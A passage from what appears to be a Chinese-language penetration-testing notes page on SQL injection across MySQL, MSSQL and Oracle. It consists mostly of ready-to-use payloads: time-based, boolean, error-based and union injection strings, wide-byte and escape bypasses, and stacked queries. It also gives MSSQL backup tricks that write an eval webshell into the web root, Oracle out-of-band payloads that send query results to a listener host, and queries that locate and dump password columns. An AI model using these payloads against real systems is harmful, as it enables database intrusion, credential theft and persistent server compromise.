<h4 id="延时盲注-基于时间"><a href="#延时盲注-基于时间" class="headerlink" title="延时盲注-基于时间"></a>延时盲注-基于时间</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一般会用到几个函数。使用这些的效果，是为了延缓mysql的操作，从而检测到与平时有异的情况：</span><br><span class="line">SLEEP(n) 让mysql停n秒钟</span><br><span class="line">BENCHMARK(count,expr) 重复countTimes次执行表达式expr</span><br><span class="line"></span><br><span class="line">一些注意事项：</span><br><span class="line">使用基于时间的盲注比较不准确，因为这还取决于当前的网络环境。</span><br><span class="line">时间延缓最好不要超过30秒，否则容易导致mysql的API连接超时。</span><br><span class="line">当在页面上看不到任何明显变化时，再考虑选择使用延时注入。</span><br><span class="line"></span><br><span class="line">检测方法:</span><br><span class="line">1 and sleep(5)=0 limit 1 #</span><br><span class="line">1) OR SLEEP(25)=0 LIMIT 1 #</span><br><span class="line">1&#x27; OR SLEEP(25)=0 LIMIT 1 #</span><br><span class="line">&#x27;) OR SLEEP(25)=0 LIMIT 1 #</span><br><span class="line">1)) OR SLEEP(25)=0 LIMIT 1 #</span><br><span class="line">SELECT SLEEP(25) #</span><br><span class="line"></span><br><span class="line">延迟三秒:</span><br><span class="line">BENCHMARK(100000,SHA1(1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">if(xxxxx,1,sleep(2))</span><br><span class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,BENCHMARK(100000,SHA1(1)),0)</span><br><span class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,SLEEP(10),0)</span><br></pre></td></tr></table></figure>
<h4 id="盲注常用ascii"><a href="#盲注常用ascii" class="headerlink" title="盲注常用ascii"></a>盲注常用ascii</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">w=119</span><br><span class="line">f=102</span><br><span class="line">r=114</span><br><span class="line">o=111</span><br><span class="line">t=116</span><br><span class="line">u=117</span><br><span class="line">5=53</span><br><span class="line">1=49</span><br></pre></td></tr></table></figure>
<h3 id="特殊注入："><a href="#特殊注入：" class="headerlink" title="特殊注入："></a>特殊注入：</h3><h4 id="引号逃逸："><a href="#引号逃逸：" class="headerlink" title="引号逃逸："></a>引号逃逸：</h4><h5 id="宽字节逃逸："><a href="#宽字节逃逸：" class="headerlink" title="宽字节逃逸："></a>宽字节逃逸：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">观察网页编码：</span><br><span class="line">&lt;meta charset=&quot;gb2312&quot; /&gt;</span><br><span class="line"></span><br><span class="line">GBK编码，它的编码范围是0x8140~0xFEFE（不包括xx7F），在遇到%df(ascii(223))&gt;ascii(128)时自动拼接%5c，因此吃掉&#x27;\&#x27;，而%27、%20小于ascii(128)的字符就保留了。</span><br><span class="line">补充：</span><br><span class="line">1.GB2312是被GBK兼容的，它的高位范围是0xA1~0xF7，低位范围是0xA1~0xFE（0x5C不在该范围内），因此不能使用编码吃掉%5c。其它的宽字符集也是一样的分析过程，要吃掉%5c，只需要低位中包含正常的0x5c就行了。</span><br><span class="line">2.Mysql编码与过滤函数推荐使用mysql_real_escape_string()，mysql_set_charset()。</span><br><span class="line">3.转编码函数同样会引起宽字节注入，即使使用了安全的设置函数。</span><br><span class="line">常用payload：</span><br><span class="line">%df%27</span><br><span class="line">%e5%5c%27</span><br><span class="line">%e9%8c%a6</span><br><span class="line">index.php?name=1%df&#x27;</span><br><span class="line">index.php?name=1%a1&#x27;</span><br><span class="line">index.php?name=1%aa&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="转义逃逸"><a href="#转义逃逸" class="headerlink" title="转义逃逸"></a>转义逃逸</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用\转义</span><br><span class="line">payload:</span><br><span class="line">index.php?name=%**%5c%5c%27</span><br></pre></td></tr></table></figure>

<h4 id="图片注入"><a href="#图片注入" class="headerlink" title="图片注入"></a>图片注入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">图片插入到数据库中，需要查询提取数据</span><br><span class="line">例题：</span><br><span class="line">http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df%27union%20select%201,2,user(),4%23.jpg</span><br></pre></td></tr></table></figure>

<h4 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqli_multi_query函数，可以执行多行 SQL 语句</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">username=1&#x27;;set @sql=concat(&#x27;up&#x27;,&#x27;date `score` set listen=123 where username=&quot;火华&quot;&#x27;);prepare sql_exe FROM @sql;execute sql_exe#</span><br><span class="line">-1&#x27;;Set @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);Prepare stmt from @sql;EXECUTE stmt;#</span><br></pre></td></tr></table></figure>
<h2 id="其他要点"><a href="#其他要点" class="headerlink" title="其他要点"></a>其他要点</h2><h3 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">隐式转换：</span><br><span class="line">MariaDB [myclass]&gt; select &quot;-1&quot;=-1;</span><br><span class="line">+---------+</span><br><span class="line">| &quot;-1&quot;=-1 |</span><br><span class="line">+---------+</span><br><span class="line">|       1 |</span><br><span class="line">+---------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [myclass]&gt; select &quot;-1&quot;=1;</span><br><span class="line">+--------+</span><br><span class="line">| &quot;-1&quot;=1 |</span><br><span class="line">+--------+</span><br><span class="line">|      0 |</span><br><span class="line">+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">字符等于0：</span><br><span class="line">MariaDB [myclass]&gt; select &#x27;aaa&#x27;=0;</span><br><span class="line">+---------+</span><br><span class="line">| &#x27;aaa&#x27;=0 |</span><br><span class="line">+---------+</span><br><span class="line">|       1 |</span><br><span class="line">+---------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [myclass]&gt; select &#x27;aaa&#x27;=1;</span><br><span class="line">+---------+</span><br><span class="line">| &#x27;aaa&#x27;=1 |</span><br><span class="line">+---------+</span><br><span class="line">|       0 |</span><br><span class="line">+---------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [myclass]&gt; select &#x27;aaa&#x27;+123;</span><br><span class="line">+-----------+</span><br><span class="line">| &#x27;aaa&#x27;+123 |</span><br><span class="line">+-----------+</span><br><span class="line">|       123 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>

<h3 id="Mysql字符编码利用技巧"><a href="#Mysql字符编码利用技巧" class="headerlink" title="Mysql字符编码利用技巧"></a>Mysql字符编码利用技巧</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">传入的username=admin%c2，php的检测if ($username === &#x27;admin&#x27;)自然就可以绕过的，在mysql中可以正常查出username=&#x27;admin&#x27;的结果</span><br><span class="line">原理是Mysql在转换字符集的时候，将不完整的字符给忽略了。</span><br><span class="line">具体可参照P师傅文章:https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</span><br></pre></td></tr></table></figure>

<h3 id="隐式类型转换"><a href="#隐式类型转换" class="headerlink" title="隐式类型转换"></a>隐式类型转换</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1.字符串为：0 false</span><br><span class="line">2.非零数字+字符串为：非0数字 ture</span><br><span class="line">3.零+字符串为：0 false</span><br><span class="line">总结：mysql也会把字符串强制转化为开头的数字，若开头是字母则强制转化为0</span><br></pre></td></tr></table></figure>
<h2 id="版本特性"><a href="#版本特性" class="headerlink" title="版本特性"></a>版本特性</h2><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">mysql5.0以后 information.schema库出现</span><br><span class="line">mysql5.1以后 udf 导入xx\lib\plugin\ 目录下</span><br><span class="line">mysql5.x以后 system执行命令</span><br></pre></td></tr></table></figure>

<h2 id="最新技术"><a href="#最新技术" class="headerlink" title="最新技术"></a>最新技术</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL注入的两个小Trick与总结</span><br><span class="line">https://www.anquanke.com/post/id/158674</span><br></pre></td></tr></table></figure>

<h1 id="Mssql注入"><a href="#Mssql注入" class="headerlink" title="Mssql注入"></a>Mssql注入</h1><h2 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">初步注入：</span><br><span class="line">Version             SELECT @@VERSION</span><br><span class="line">Current User        SELECT user_name();</span><br><span class="line">                    SELECT system_user;</span><br><span class="line">                    SELECT user;</span><br><span class="line">                    SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID </span><br><span class="line">Current Database    SELECT db_name()</span><br></pre></td></tr></table></figure>

<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Error Based SQLi</span><br><span class="line">For integer inputs : convert(int,@@version)</span><br><span class="line">For string inputs  : &#x27; + convert(int,@@version) +&#x27;</span><br><span class="line"></span><br><span class="line">The attacks above should throw conversion errors.</span><br><span class="line">Clear SQLi Tests These tests are simply good for boolean sql injection and silent attacks.</span><br><span class="line"></span><br><span class="line">product.asp?id=4</span><br><span class="line">product.asp?id=5-1</span><br><span class="line">product.asp?id=4 OR 1=1</span><br></pre></td></tr></table></figure>

<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">WAITFOR DELAY</span><br><span class="line">&#x27;0:0:10&#x27;--</span><br><span class="line">Real World Samples ProductID=1;waitfor delay &#x27;0:0:10&#x27;--</span><br><span class="line">ProductID=1);waitfor delay &#x27;0:0:10&#x27;--</span><br><span class="line">ProductID=1&#x27;;waitfor delay &#x27;0:0:10&#x27;--</span><br><span class="line">ProductID=1&#x27;);waitfor delay &#x27;0:0:10&#x27;--</span><br><span class="line">ProductID=1));waitfor delay &#x27;0:0:10&#x27;--</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line">DROP sampletable;--</span><br><span class="line">DROP sampletable;# </span><br><span class="line">Username: admin&#x27;--</span><br><span class="line">SELECT * FROM members WHERE username = &#x27;admin&#x27;--&#x27; AND password = &#x27;password&#x27;</span><br><span class="line"></span><br><span class="line">DROP/*comment*/sampletable</span><br><span class="line">DR/**/OP/*bypass blacklisting*/sampletable</span><br></pre></td></tr></table></figure>

<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">SQL Server If Statement</span><br><span class="line">IF condition true-part ELSE false-part (S)</span><br><span class="line">IF (1=1) SELECT &#x27;true&#x27; ELSE SELECT &#x27;false&#x27;</span><br><span class="line">If Statement SQL Injection Attack Samples</span><br><span class="line"></span><br><span class="line">if ((select user) = &#x27;sa&#x27; OR (select user) = &#x27;dbo&#x27;) select 1 else select 1/0 (S)</span><br><span class="line">This will throw an divide by zero error if current logged user is not &quot;sa&quot; or &quot;dbo&quot;.</span><br><span class="line"></span><br><span class="line">绕过逗号：</span><br><span class="line">SELECT CHAR(75)+CHAR(76)+CHAR(77)</span><br><span class="line">This will return &#x27;KLM&#x27;.</span><br></pre></td></tr></table></figure>

<h2 id="特殊查询"><a href="#特殊查询" class="headerlink" title="特殊查询"></a>特殊查询</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlserver查找某个字段在哪张表里</span><br><span class="line"><span class="keyword">select</span> [name] <span class="keyword">from</span> [库名].[dbo].sysobjects <span class="keyword">where</span> id <span class="keyword">in</span>(<span class="keyword">select</span> id <span class="keyword">from</span> [库名].[dbo].syscolumns <span class="keyword">Where</span> name<span class="operator">=</span><span class="string">&#x27;字段名&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><p>mssql注入技巧</p>
<p><a href="https://www.waitalone.cn/sqlserver-inject-skills.html">https://www.waitalone.cn/sqlserver-inject-skills.html</a></p>
<p>MSSQL多种姿势拿shell和提权</p>
<p><a href="https://y4er.com/post/mssql-getshell/#getshell">https://y4er.com/post/mssql-getshell/#getshell</a></p>
<h2 id="dba权限-sa"><a href="#dba权限-sa" class="headerlink" title="dba权限(sa)"></a>dba权限(sa)</h2><h3 id="xp-cmdshell提权"><a href="#xp-cmdshell提权" class="headerlink" title="xp_cmdshell提权"></a>xp_cmdshell提权</h3><h3 id="sp-oacreate提权"><a href="#sp-oacreate提权" class="headerlink" title="sp_oacreate提权"></a>sp_oacreate提权</h3><h2 id="db-owner权限"><a href="#db-owner权限" class="headerlink" title="db_owner权限"></a>db_owner权限</h2><h3 id="Log备份Getshell"><a href="#Log备份Getshell" class="headerlink" title="Log备份Getshell"></a>Log备份Getshell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;alter database test set RECOVERY FULL--</span><br><span class="line">;create table cmd (a image)--</span><br><span class="line">;backup log test to disk = &#x27;c:/1.bak&#x27; with init--</span><br><span class="line">;insert into cmd (a) values (&#x27;&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;saul&quot;],&quot;unsafe&quot;);%&gt;&#x27;)--</span><br><span class="line">;backup log test to disk = &#x27;c:\inetpub\wwwroot\saul.aspx&#x27;--</span><br><span class="line">;drop table cmd--</span><br></pre></td></tr></table></figure>

<h3 id="差异备份Getshell"><a href="#差异备份Getshell" class="headerlink" title="差异备份Getshell"></a>差异备份Getshell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. backup database 库名 to disk = &#x27;c:\bak.bak&#x27;;--</span><br><span class="line">2. create table [dbo].[test] ([cmd] [image]);--</span><br><span class="line">3. insert into test(cmd) values(&#x27;&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;saul&quot;],&quot;unsafe&quot;);%&gt;&#x27;)--</span><br><span class="line">4. backup database 库名 to disk=&#x27;C:\d.asp&#x27; WITH DIFFERENTIAL,FORMAT;--</span><br></pre></td></tr></table></figure>

<h2 id="public权限"><a href="#public权限" class="headerlink" title="public权限"></a>public权限</h2><h1 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h1><h2 id="识别注入点"><a href="#识别注入点" class="headerlink" title="识别注入点"></a>识别注入点</h2><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">判断注入点：</span><br><span class="line">使用经典的单引号,and 1=1,1=2即可，视具体环境可能需要进行一些绕过的操作</span><br><span class="line"></span><br><span class="line">确定数据库类型payload:</span><br><span class="line">||,如and &#x27;12&#x27;=&#x27;1&#x27;||&#x27;2&#x27;</span><br><span class="line">and exists(select * from dual/user_tables)</span><br></pre></td></tr></table></figure>

<h2 id="显错注入"><a href="#显错注入" class="headerlink" title="显错注入"></a>显错注入</h2><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">在能够显示出具体报错信息的情况下，个人更加倾向使用报错注入，这样能够以一个更快的速度，去获取我们想要的信息</span><br><span class="line"></span><br><span class="line">常用函数：</span><br><span class="line">utl_inaddr.get_host_name()    #这个支持oracle10及以下，不支持oracle11</span><br><span class="line">ctxsys.drithsx.sn()           #这个支持oracle11</span><br><span class="line"></span><br><span class="line">测试:</span><br><span class="line">utl_inaddr.get_host_name()</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217172612947.png" alt="image-20251217172612947"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ctxsys.drithsx.sn()</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217172723669.png" alt="image-20251217172723669"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">两个测试都可以得到连接用户为DATASPT</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">or 1=utl_inaddr.get_host_address((sql注入语句))</span><br><span class="line"></span><br><span class="line">注意：这里要加双层括号，否则会提示缺失表达式；以及注意短路求值机制，我们必须让这条语句得到执行，另外优先级为先and后or</span><br><span class="line"></span><br><span class="line">这个函数的本意是获取ip地址，但是如果传递参数无法得到解析就会返回一个oracle错误并显示传递的参数。我们传递的是一个sql语句所以返回的就是语句执行的结果。oracle在启动之后，把一些系统变量都放置到一些特定的视图当中，可以利用这些视图获得想要的东西。通常非常重要的信息有：</span><br><span class="line">1 当前用户权限 select * from session_roles where rownum=1</span><br><span class="line">2 当前数据库版本 select banner from sys.v_$version where rownum=1</span><br><span class="line">3 服务器出口IP 用utl_http.request 可以实现</span><br><span class="line">4 服务器监听IP select utl_inaddr.get_host_address from dual</span><br><span class="line">5 服务器操作系统 select member from v$logfile where rownum=1</span><br><span class="line">6 服务器sid 远程连接的话需要，select instance_name fromv$instance; &#x27; n</span><br><span class="line">7 当前连接用户 select SYS_CONTEXT (&#x27;USERENV&#x27;, &#x27;CURRENT_USER&#x27;)from dual</span><br><span class="line">信息收集完毕，开始注入，先来查找可能含有后台密码信息表和列：</span><br><span class="line">查看名字类似于PASSWORD的表有几个：</span><br><span class="line">select count(*) from user_tab_columns where column_name like &#x27;%25PASS%25&#x27;</span><br><span class="line"></span><br><span class="line">接下来，鉴于使用where rownum=1 and table_name&lt;&gt;&#x27;前面查到的表名&#x27;的方法需要在不等号的后面不断地添加新的表名，操作起来较为繁琐，这里给出了另外的一种注入方法：</span><br><span class="line">select data from (select rownum as limit,table_name||&#x27;---&gt;&#x27;||column_name as data from user_tab_columns where column_name like &#x27;%PASSWORD%&#x27;) where limit =2   //由于rownum的伪列性质，这里要嵌套，不然会提示未选定列</span><br><span class="line"></span><br><span class="line">这样只要修改一个数字即可实现得到信息，方便挂载到burp上自动来跑：</span><br><span class="line"></span><br><span class="line">查列名：</span><br><span class="line">select data from (selEct rownum as limit,column_name as data from user_tab_columns whEre table_name=你刚才查到的tablename) whEre limit =1</span><br><span class="line"></span><br><span class="line">查数据：</span><br><span class="line">Select data from (selEct rownum as limit,PASSWORD||chr(35)||id||chr(35)||列名1||chr(35)||列名2||chr(35)||列名3 as data from 表名        //使用||一次性查出一堆数据</span><br></pre></td></tr></table></figure>

<h2 id="oracle联合查询"><a href="#oracle联合查询" class="headerlink" title="oracle联合查询"></a>oracle联合查询</h2><p>（以下内容为可union select，有回显的情况下）</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">判断字段数：</span><br><span class="line">order by N (数字型或者注释可用)   union select null,null,null  from ... (引号包裹且注释符不可用)</span><br><span class="line"></span><br><span class="line">确定字段N的值后，and 1=2 union select NULL,NULL,.... from dual 再把这些NULL逐步的替换成数字，变成数字报错的话，就用字符去试，最终确定所有字段的数据类型</span><br><span class="line"></span><br><span class="line">找到回显位置后，我们可以通过把回显位置的数字换成下列语句来获取信息：</span><br><span class="line">获取数据库版本：select banner from sys.v_$version where rownum=1</span><br><span class="line"></span><br><span class="line">获取操作系统版本：select member from v$logfile where rownum=1</span><br><span class="line">获取当前连接数据库的用户：select SYS_CONTEXT (&#x27;USERENV&#x27;, &#x27;CURRENT_USER&#x27;)from dual</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">信息收集完毕，接下来来获取表的信息:</span><br><span class="line">select table_name from user_tables where rownum=1</span><br><span class="line"></span><br><span class="line">select table_name from user_tables where rownum=1 and table_name&lt;&gt;&#x27;第一个表名&#x27;</span><br><span class="line"></span><br><span class="line">或者我们想要快一点的话，就像报错注入一样，获取到所有表的名字：</span><br><span class="line">select data from (select rownum as limit,table_name||&#x27;---&gt;&#x27;||column_name as data from user_tab_columns where column_name like &#x27;%PASSWORD%&#x27;) where limit =N</span><br><span class="line"></span><br><span class="line">获取列的信息：</span><br><span class="line">select column_name from user_tab_columns where table_name=&#x27;manage&#x27; and rownum=1</span><br><span class="line"></span><br><span class="line">select column_name from user_tab_columns where table_name=&#x27;manage&#x27; and rownum=1 and column_name&lt;&gt;&#x27;第一个列名&#x27;</span><br><span class="line"></span><br><span class="line">快一点的方法：</span><br><span class="line">select data from (select rownum as limit,column_name as data from user_tab_columns whEre table_name=你刚才查到的tablename) where limit =N</span><br><span class="line"></span><br><span class="line">从而可以获得所有的列名。</span><br><span class="line"></span><br><span class="line">获取数据:</span><br><span class="line">and 1=2 union select 1,2,列名,4,5,6 from 表名</span><br><span class="line"></span><br><span class="line">快一点的方法就是通过使用||，来一次性查出多个列中的数据。</span><br><span class="line">获取其他的数据库:</span><br><span class="line">select owner from all_tables where rownum=1</span><br><span class="line">select owner from all_tables where rownum=1 and owner&lt;&gt;&#x27;第一个数据库库名&#x27;</span><br><span class="line">从而就可以获取到所有的数据库</span><br></pre></td></tr></table></figure>

<h2 id="oracle盲注"><a href="#oracle盲注" class="headerlink" title="oracle盲注"></a>oracle盲注</h2><p>在注入点由于无法回显、或者SQL语句难以闭合导致无法使用union select或者注释，或者报错时并不显示出详细的报错信息时，基本就需要盲注了。</p>
<h3 id="oracle布尔盲注"><a href="#oracle布尔盲注" class="headerlink" title="oracle布尔盲注"></a>oracle布尔盲注</h3><p>例如在一个查询处，我们可以通过name&#x3D;xxX得到一条正确的数据，这时候就可以使用布尔型的盲注（以获取user表的长度为例）：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">xxX&#x27; and (select length(user) from dual)=N or &#x27;1&#x27;=&#x27;1     //N为我们猜测的长度，即直接使用and一个与注入有关的表达式，来做布尔型的判断。</span><br></pre></td></tr></table></figure>

<p>或者我们可以使用基于值的方式:</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">xx&#x27;||decode((SELECT length(user) from dual),N,&#x27;X&#x27;,&#x27;1&#x27;) or &#x27;1&#x27;=&#x27;1    //decode即相当于ORACLE中的if语句，如果长度为N就返回最后一位X，即让查询成功。</span><br></pre></td></tr></table></figure>

<p>获取user表的内容：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">xxX&#x27; and (ascii(substr((select user from dual),1,1)))=猜测的ascii码 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>常用payload：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1) AND 4130=5598 AND (8042=8042</span><br><span class="line">1) AND 6785=6785 AND (6807=6807</span><br><span class="line">1 AND 9314=2888</span><br><span class="line">1 AND 6785=6785</span><br><span class="line">1 AND 9975=9573-- IGvt</span><br><span class="line">1 AND 6785=6785-- QaMs</span><br><span class="line">1&#x27;) AND 3166=2235 AND (&#x27;EpuN&#x27;=&#x27;EpuN</span><br><span class="line">1&#x27;) AND 6785=6785 AND (&#x27;lahe&#x27;=&#x27;lahe</span><br><span class="line">1&#x27; AND 6548=8240 AND &#x27;QLjp&#x27;=&#x27;QLjp</span><br><span class="line">1&#x27; AND 6785=6785 AND &#x27;OijB&#x27;=&#x27;OijB</span><br></pre></td></tr></table></figure>

<h3 id="oracle报错盲注"><a href="#oracle报错盲注" class="headerlink" title="oracle报错盲注"></a>oracle报错盲注</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">比如最近遇到一个注入点，尽管会报错但是并不爆出具体信息，无法报错注入；SQL语句未知且注释不可用导致union select无法闭合；查询本身是没有返回数据的，所以也不能使用布尔型blind；在这个情况下，我们使用error-based-blind(在没查询数据但能报错的时候，通过是否报错来判断表达式是否正确)：</span><br><span class="line"></span><br><span class="line">这里同样用到了decode()，以及能够使数据库报错的case()函数：</span><br><span class="line">(select cast(需要转换的值 as 新的数据类型) from dual)    //我们在试图把一个形如&#x27;yy&#x27;的字符串转换为int型的时候，ORACLE数据库会报错</span><br><span class="line"></span><br><span class="line">注意:函数参数整体都要用括号包裹起来，否则会提示缺少右括号，原理就是把‘yy’这样的字符串cast成int的时候会报Invalid Value的错误</span><br><span class="line">从而我们最终的注入语句为:</span><br><span class="line">123&#x27; or 1=(select cast((decode((SELECT length(user) from dual),N,&#x27;1&#x27;,&#x27;yy&#x27;)) as int) from dual) or &#x27;1&#x27;=&#x27;1</span><br><span class="line">从而可以得到user的长度。</span><br><span class="line"></span><br><span class="line">获取每一位的数据：</span><br><span class="line">123&#x27; or 1=(select cast((decode((ascii(substr((select user from dual),1,1))),1,&#x27;1&#x27;,&#x27;yy&#x27;)) as int) from dual) or &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">使用burpsuit来把大写字母的ASCII遍历一遍，最终得到user的名称。</span><br><span class="line">另外，除了把字母遍历一遍之外，还可以使用bitand(),把每个字母的ASCII分别与1，2，4，...128进行按位与运算，从而只需要发8次数据，就能得到它的二进制表示的ascii码。</span><br></pre></td></tr></table></figure>

<h3 id="oracle延时盲注-基于函数超时"><a href="#oracle延时盲注-基于函数超时" class="headerlink" title="oracle延时盲注-基于函数超时"></a>oracle延时盲注-基于函数超时</h3><p>原理：</p>
<p>RECEIVE_MESSAGE函数-从指定管道获取消息</p>
<p>语法：</p>
<p>DBMS_PIPE.RECEIVE_MESSAGE(‘pipename’,timeout)</p>
<p>常用payload：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">and (select length(user) from dual)=N or 1=dbms_pipe.receive_message(&#x27;RDS&#x27;,5)                           -- 同样是使用短路求值的思路，or后面的表达式最终会返回真。</span><br><span class="line">and (select length(user) from dual)=4 or 1=utl_http.request(&#x27;http://10.0.0.1/ &#x27;||(&#x27;a&#x27;)||&#x27;.html&#x27;);       -- 正确则不延迟</span><br><span class="line">1) AND 2730=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)||CHR(81)||CHR(76)||CHR(102),5) AND (6314=6314</span><br><span class="line">1 AND 2730=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)||CHR(81)||CHR(76)||CHR(102),5)</span><br><span class="line">1 AND 2730=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)||CHR(81)||CHR(76)||CHR(102),5)-- ACtH</span><br><span class="line">1&#x27;) AND 2730=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)||CHR(81)||CHR(76)||CHR(102),5) AND (&#x27;RTOk&#x27;=&#x27;RTOk</span><br><span class="line">1&#x27; AND 2730=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)||CHR(81)||CHR(76)||CHR(102),5) AND &#x27;SEal&#x27;=&#x27;SEal</span><br><span class="line"></span><br><span class="line">sqlmap中的payload：</span><br><span class="line">[ok]AND 123=DBMS_PIPE.RECEIVE_MESSAGE(&#x27;123&#x27;,5)</span><br><span class="line">[ok]OR 123=DBMS_PIPE.RECEIVE_MESSAGE(&#x27;123&#x27;,5)</span><br></pre></td></tr></table></figure>

<h3 id="oracle延时盲注-基于重查询"><a href="#oracle延时盲注-基于重查询" class="headerlink" title="oracle延时盲注-基于重查询"></a>oracle延时盲注-基于重查询</h3><p>原理：</p>
<p>即通过执行一个较为消耗资源的查询，造成数据库的延迟，再通过返回是否延迟来判断猜测的结果。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and  (select length(user) from dual)=6 or 1&lt;(SELECT count(*) FROM all_users A, all_users B, all_users C,all_users D,all_users E);</span><br></pre></td></tr></table></figure>

<p>在我们的N是正确的情况下，数据库并不会产生延迟；如果错误，则会产生延迟</p>
<p>常用payload：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">[ok]AND 123=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)</span><br><span class="line">[ok]OR 123=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)</span><br></pre></td></tr></table></figure>

<h2 id="oracle带外传输"><a href="#oracle带外传输" class="headerlink" title="oracle带外传输"></a>oracle带外传输</h2><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">即在Oracle拥有外网权限的时候，可以让Oracle把查询的结果拼接到URL里，去访问这个URL，再在我们的服务器上监听端口即可得到查询结果。（同样以查询当前用户为例）</span><br><span class="line">and (select httpuritype(&#x27;127.0.0.1:8888/&#x27;||(select user from dual)).getclob() from dual) is not null;</span><br><span class="line"></span><br><span class="line">或者也可以使用utl_http.request等函数。</span><br><span class="line"></span><br><span class="line">测试效果如下：</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217172925212.png" alt="image-20251217172925212"></p>
